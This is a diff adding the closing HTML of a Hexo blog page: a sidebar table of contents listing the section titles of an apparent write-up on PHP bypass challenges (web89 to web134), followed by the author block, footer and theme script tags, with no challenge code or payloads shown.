+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-%E7%89%B9%E6%80%A7"><span class="nav-number">1.</span> <span class="nav-text">php 特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web89-%E5%88%A9%E7%94%A8preg-match%E4%B8%8D%E8%83%BD%E5%8C%B9%E9%85%8D%E6%95%B0%E7%BB%84"><span class="nav-number">1.1.</span> <span class="nav-text">web89 利用preg_match不能匹配数组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#90-%E7%9B%B4%E6%8E%A5%E4%BC%A0%E5%85%A5%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">90 直接传入一个小数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#91"><span class="nav-number">1.3.</span> <span class="nav-text">91</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#92-93-%E9%83%BD%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E5%B0%8F%E6%95%B0%E6%9D%A5%E6%8E%A5"><span class="nav-number">1.3.1.</span> <span class="nav-text">92 93 都可以直接利用小数来接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#94-%E5%A4%9A%E4%BA%86strpos%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.</span> <span class="nav-text">94 多了strpos（）函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#96"><span class="nav-number">1.4.1.</span> <span class="nav-text">96</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#97php-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.4.2.</span> <span class="nav-text">97php 代码审计</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web99%E5%88%A9%E7%94%A8%E4%BA%86in-arry%E5%87%BD%E6%95%B0"><span class="nav-number">1.5.</span> <span class="nav-text">web99利用了in_arry函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E5%87%BD%E6%95%B0%E7%9F%A5%E8%AF%86"><span class="nav-number">1.5.1.</span> <span class="nav-text">补充函数知识</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#100-%E8%80%83%E5%AF%9F%E5%8F%8D%E5%B0%84%E7%B1%BB-%E5%92%8Cand%E5%92%8C-amp-amp-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.6.</span> <span class="nav-text">100 考察反射类 和and和&amp;&amp;的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#101-%E8%BF%87%E6%BB%A4%E4%BA%86%E5%BE%88%E5%A4%9A%E7%9B%B4%E6%8E%A5"><span class="nav-number">1.7.</span> <span class="nav-text">101 过滤了很多直接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#102-%E8%80%83%E5%AF%9Fhex2bin%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8-%E4%BB%A5%E5%8F%8A%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="nav-number">1.8.</span> <span class="nav-text">102 考察hex2bin函数的使用 以及回调函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#104-105-sha1%E5%87%BD%E6%95%B0%E7%A2%B0%E6%92%9E-%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84"><span class="nav-number">1.9.</span> <span class="nav-text">104-105 sha1函数碰撞-无法处理数组</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#106-foreach%E5%87%BD%E6%95%B0-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">1.9.1.</span> <span class="nav-text">106 foreach函数    变量覆盖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#107parse-str%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">1.9.2.</span> <span class="nav-text">107parse_str函数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#108-ereg%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87-%E5%AD%98%E5%9C%A8-00%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.9.3.</span> <span class="nav-text">108 ereg函数绕过       存在%00截断漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#109-%E5%AF%B9%E7%B1%BB%E7%9A%84%E7%BB%95%E8%BF%87-%E5%88%A9%E7%94%A8%E7%B1%BB%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="nav-number">1.9.4.</span> <span class="nav-text">109 对类的绕过   利用类的异常处理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#110-%E5%AF%B9%E7%B1%BB%E7%9A%84%E7%BB%95%E8%BF%87-filesystemiterator"><span class="nav-number">1.10.</span> <span class="nav-text">110  对类的绕过 filesystemiterator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#111-%E7%AE%80%E5%8D%95%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E7%94%A8globals%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E6%9D%A5%E8%BE%93%E5%87%BA"><span class="nav-number">1.11.</span> <span class="nav-text">111 简单变量覆盖 用globals全局变量来输出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#112-is-file%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87-%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BC%96%E7%A0%81%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96"><span class="nav-number">1.12.</span> <span class="nav-text">&#x3D;&#x3D;112&#x3D;&#x3D;     is_file函数绕过 常用的编码伪协议读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#113-is-file%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">1.13.</span> <span class="nav-text">113 is_file函数绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#134-SERVER-%E2%80%98QUERY-STRING%E2%80%99-%E8%A7%A3%E9%87%8A-%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.14.</span> <span class="nav-text">134[$_SERVER[‘QUERY_STRING’]解释]学习</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
